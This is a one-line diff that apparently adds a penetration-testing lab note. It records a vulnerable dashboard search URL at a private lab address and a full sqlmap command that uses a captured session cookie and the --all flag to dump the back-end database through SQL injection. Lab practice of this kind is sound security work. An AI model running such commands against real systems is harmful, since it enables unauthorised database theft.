@@ -1,0 +1,1 @@
+http://10.10.10.46/dashboard.php?search=test (GET)  # /usr/bin/sqlmap http://10.10.10.46/dashboard.php?search=test --cookie=PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4 --all
